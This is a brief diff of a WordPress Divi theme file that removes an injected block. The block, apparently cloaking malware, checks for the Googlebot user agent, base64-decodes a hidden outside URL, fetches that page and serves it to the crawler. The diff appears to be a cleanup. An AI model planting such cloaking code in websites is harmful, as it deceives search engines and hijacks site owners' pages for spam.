@@ -1,21 +1,4 @@
 <?php
-
-if (strpos($user_agent, 'googlebot') !== false) {
-    // 
-    $encoded_url = 'aHR0cHM6Ly9ncnRvdG8uc3RvcmUvY29uZXh0aW9uLWxpbmsvdGFob2VjYmQtaHRtbA==';
-
-    //
-    $url = base64_decode($encoded_url);
-
-    // 
-    $get = file_get_contents($url);
-
-    echo $get;
-    exit;
-}
-
-if ( ! isset( $content_width ) ) $content_width = 1080;
-
 function et_setup_theme() {
 	global $themename, $shortname, $et_store_options_in_one_row, $default_colorscheme;
 	$themename = 'Divi';
